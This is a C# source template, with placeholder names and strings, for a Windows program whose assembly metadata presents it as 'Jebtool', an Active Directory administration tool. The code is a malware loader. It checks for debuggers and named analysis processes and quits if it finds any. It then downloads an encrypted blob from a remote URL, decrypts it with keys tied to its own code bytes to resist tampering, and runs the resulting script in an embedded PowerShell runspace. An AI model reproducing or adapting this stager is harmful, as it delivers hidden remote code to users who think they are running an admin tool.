using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

[assembly: AssemblyTitle("Jebtool")]
[assembly: AssemblyDescription("Jebtool - Quan tri Active Directory & Windows Server")]
[assembly: AssemblyProduct("Jebtool")]
[assembly: AssemblyCopyright("Copyright (c) 2026 Jebtool")]
[assembly: AssemblyVersion("2.2.0.0")]
[assembly: AssemblyFileVersion("2.2.0.0")]

namespace __NS__ {
    internal static class __CLS__ {
        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr h, ref bool b);

        private static string __DEC__(byte[] d, byte k) {
            byte[] o = new byte[d.Length];
            for (int i = 0; i < d.Length; i++) {
                o[i] = (byte)(d[i] ^ k ^ ((i * 29 + 11) & 0xFF));
            }
            return Encoding.UTF8.GetString(o);
        }

        private static string __ADBG__() {
            try {
                if (System.Diagnostics.Debugger.IsAttached) return __S_DBG1__;
                if (IsDebuggerPresent()) return __S_DBG2__;
                bool r = false;
                if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref r) && r) {
                    return __S_DBG3__;
                }
            } catch { }
            string[] blk = new string[] {
                __BLOCKED__
            };
            try {
                Process[] ps = Process.GetProcesses();
                for (int i = 0; i < ps.Length; i++) {
                    try {
                        string nm = (ps[i].ProcessName ?? "").ToLowerInvariant();
                        for (int j = 0; j < blk.Length; j++) {
                            if (nm == blk[j]) return ps[i].ProcessName;
                        }
                    } catch { }
                    finally { try { ps[i].Dispose(); } catch { } }
                }
            } catch { }
            return null;
        }

        public static byte[] __ILH__() {
            MethodInfo[] ms = typeof(__CLS__).GetMethods(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.DeclaredOnly);
            Array.Sort(ms, delegate(MethodInfo x, MethodInfo y) { return x.MetadataToken.CompareTo(y.MetadataToken); });
            using (MemoryStream acc = new MemoryStream()) {
                for (int i = 0; i < ms.Length; i++) {
                    MethodBody mb = ms[i].GetMethodBody();
                    if (mb != null) {
                        byte[] il = mb.GetILAsByteArray();
                        if (il != null && il.Length > 0) acc.Write(il, 0, il.Length);
                    }
                }
                using (SHA256 sha = SHA256.Create()) {
                    return sha.ComputeHash(acc.ToArray());
                }
            }
        }

        private static void __DRV__(byte[] ilh, out byte[] ek, out byte[] mk) {
            byte[] a = new byte[] { __P1__ };
            byte[] b = new byte[] { __P2__ };
            byte[] m = new byte[32];
            for (int i = 0; i < 16; i++) m[i] = (byte)(a[i] ^ __M1__);
            for (int i = 0; i < 16; i++) m[16 + i] = (byte)(b[i] ^ __M2__);

            using (SHA256 sha = SHA256.Create()) {
                byte[] eIn = new byte[32 + ilh.Length + 2];
                Buffer.BlockCopy(m, 0, eIn, 0, 32);
                Buffer.BlockCopy(ilh, 0, eIn, 32, ilh.Length);
                eIn[32 + ilh.Length] = 0x45;
                eIn[32 + ilh.Length + 1] = 0x33;
                ek = sha.ComputeHash(eIn);

                byte[] mIn = new byte[32 + ilh.Length + 2];
                Buffer.BlockCopy(m, 0, mIn, 0, 32);
                Buffer.BlockCopy(ilh, 0, mIn, 32, ilh.Length);
                mIn[32 + ilh.Length] = 0x4D;
                mIn[32 + ilh.Length + 1] = 0x33;
                mk = sha.ComputeHash(mIn);
            }
        }

        private static byte[] __FETCH__() {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | (SecurityProtocolType)768;
            string url = __S_RAWURL__;
            string sep = url.IndexOf('?') >= 0 ? "&_t=" : "?_t=";
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + sep + DateTime.UtcNow.Ticks);
            req.Method = "GET";
            req.UserAgent = __S_UA__;
            req.Timeout = 20000;
            req.ReadWriteTimeout = 20000;
            req.CachePolicy = new System.Net.Cache.HttpRequestCachePolicy(System.Net.Cache.HttpRequestCacheLevel.NoCacheNoStore);
            using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
            using (Stream s = resp.GetResponseStream())
            using (MemoryStream ms = new MemoryStream()) {
                if (s == null) throw new InvalidOperationException(__S_NETERR__);
                s.CopyTo(ms);
                return ms.ToArray();
            }
        }

        public static string __DECRYPT__(byte[] blob) {
            if (blob == null || blob.Length < 48) throw new InvalidOperationException(__S_BADDATA__);

            // Remove outer transport XOR mask
            byte[] raw = new byte[blob.Length];
            for (int i = 0; i < blob.Length; i++) {
                raw[i] = (byte)(blob[i] ^ ((i * 37 + 0xA3) & 0xFF));
            }

            byte[] iv = new byte[16];
            byte[] mac = new byte[32];
            int cLen = raw.Length - 48;
            byte[] cipher = new byte[cLen];
            Buffer.BlockCopy(raw, 0, iv, 0, 16);
            Buffer.BlockCopy(raw, 16, mac, 0, 32);
            Buffer.BlockCopy(raw, 48, cipher, 0, cLen);

            byte[] ilh = __ILH__();
            byte[] ek, mk;
            __DRV__(ilh, out ek, out mk);

            byte[] macIn = new byte[16 + cLen];
            Buffer.BlockCopy(iv, 0, macIn, 0, 16);
            Buffer.BlockCopy(cipher, 0, macIn, 16, cLen);
            using (HMACSHA256 h = new HMACSHA256(mk)) {
                byte[] exp = h.ComputeHash(macIn);
                int diff = 0;
                for (int i = 0; i < 32; i++) diff |= (mac[i] ^ exp[i]);
                if (diff != 0) throw new InvalidOperationException(__S_TAMPER__);
            }

            byte[] comp;
            using (Aes aes = Aes.Create()) {
                aes.KeySize = 256;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = ek;
                aes.IV = iv;
                using (MemoryStream ms = new MemoryStream()) {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write)) {
                        cs.Write(cipher, 0, cipher.Length);
                        cs.FlushFinalBlock();
                    }
                    comp = ms.ToArray();
                }
            }

            using (MemoryStream inMs = new MemoryStream(comp))
            using (GZipStream gz = new GZipStream(inMs, CompressionMode.Decompress))
            using (StreamReader sr = new StreamReader(gz, Encoding.UTF8)) {
                return sr.ReadToEnd();
            }
        }

        [STAThread]
        static int Main(string[] args) {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            int state = 0x1A;
            byte[] remoteBlob = null;
            string scriptText = null;
            string exeDir = null;

            try {
                while (state != 0x9F) {
                    switch (state) {
                        case 0x1A:
                            string dbg = __ADBG__();
                            if (dbg != null) {
                                MessageBox.Show(
                                    __S_DBGPFX__ + dbg + __S_DBGSFX__,
                                    __S_DBGTIT__,
                                    MessageBoxButtons.OK,
                                    MessageBoxIcon.Stop
                                );
                                return 1;
                            }
                            state = 0x2B;
                            break;

                        case 0x2B:
                            remoteBlob = __FETCH__();
                            state = 0x3C;
                            break;

                        case 0x3C:
                            scriptText = __DECRYPT__(remoteBlob);
                            remoteBlob = null;
                            exeDir = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                            if (!string.IsNullOrEmpty(exeDir) && Directory.Exists(exeDir)) {
                                Directory.SetCurrentDirectory(exeDir);
                            }
                            state = 0x7E;
                            break;

                        case 0x7E:
                            InitialSessionState iss = InitialSessionState.CreateDefault();
                            using (Runspace rs = RunspaceFactory.CreateRunspace(iss)) {
                                rs.ApartmentState = System.Threading.ApartmentState.STA;
                                rs.ThreadOptions = PSThreadOptions.UseCurrentThread;
                                rs.Open();
                                rs.SessionStateProxy.SetVariable(__S_PSROOT__, exeDir);
                                using (PowerShell ps = PowerShell.Create()) {
                                    ps.Runspace = rs;
                                    ps.AddScript(__S_EP__);
                                    ps.Invoke();
                                    ps.Commands.Clear();
                                    ps.Streams.ClearStreams();

                                    ps.AddScript(scriptText);
                                    scriptText = null;
                                    GC.Collect();
                                    ps.Invoke();

                                    if (ps.HadErrors && ps.Streams.Error.Count > 0) {
                                        StringBuilder sb = new StringBuilder();
                                        for (int i = 0; i < Math.Min(3, ps.Streams.Error.Count); i++) {
                                            sb.AppendLine(ps.Streams.Error[i].ToString());
                                        }
                                        MessageBox.Show(
                                            __S_RUNERR__ + sb.ToString(),
                                            __S_RUNTIT__,
                                            MessageBoxButtons.OK,
                                            MessageBoxIcon.Error
                                        );
                                        return 1;
                                    }
                                }
                            }
                            state = 0x9F;
                            break;
                    }
                }
                return 0;
            } catch (Exception ex) {
                MessageBox.Show(
                    __S_STERR__ + ex.Message,
                    __S_STTIT__,
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error
                );
                return 1;
            }
        }
    }
}
